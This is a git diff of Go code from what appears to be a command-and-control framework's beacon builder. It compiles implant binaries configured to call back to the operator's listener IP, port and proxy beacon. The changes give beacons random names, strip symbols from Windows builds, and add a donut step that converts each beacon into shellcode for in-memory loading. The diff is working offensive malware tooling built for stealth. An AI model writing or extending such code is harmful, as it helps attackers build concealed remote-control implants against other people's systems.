@@ -49,11 +49,13 @@ func createBeacon(listener int) {
 	input = "n"//, err = reader.ReadString('\n')
 	ip := getIfaceIp(listeners[listener].Iface)
 	port := strconv.Itoa(listeners[listener].Port)
-	beaconName := "beacon" + ip + "." + port	
 	beaconId := genRandID()
+	beaconName := beaconId//"beacon" + ip + "." + port	
+	buildFlags := ""
 
 	if target == "windows" {
 		beaconName += ".exe"
+		buildFlags += "-s -w"
 	}
 
 	//if err != nil {
@@ -85,15 +87,17 @@ func createBeacon(listener int) {
 		notifyBeaconOfProxyUpdate(beacon, beaconId)
 
 		fmt.Println("Using beacon " + beacon.Id + "@" + beacon.Ip + " as proxy.")
-		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '-X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
+		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdProxyId=" + beacon.Id + " -X main.cmdProxyIp=" + beacon.Ip + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
 	} else {
 		fmt.Println("No proxy")
-		exec.Command("/bin/sh", "-c", "env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '-X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o out/" + beaconName + " beacon/*.go").Output()
+		exec.Command("/bin/sh", "-c", "cd beacon; env CGO_ENABLED=0 GOOS=" + target + " GOARCH=" + platform + " go build -ldflags '" + buildFlags + " -X main.id=" + beaconId + " -X main.cmdAddress=" + ip + " -X main.cmdPort=" + port + " -X main.cmdHost=command.com' -o ../out/" + beaconName).Output()
 	}
 
 	//beacon := &Beacon{"n/a", beaconId, nil, nil, nil, nil, time.Time{}}
 	// beacons = append(beacons, beacon)
 	fmt.Println("Saved beacon for listener " + getIfaceIp(listeners[listener].Iface) + ":" + strconv.Itoa(listeners[listener].Port) + "%" + listeners[listener].Iface + " to out/" + beaconName)
+	out, err := exec.Command("/bin/sh", "-c", "./utils/donut out/" + beaconName + " -o out/" + beaconName + ".bin").Output()
+	fmt.Println(string(out))
 }
 
 func listTargets() {
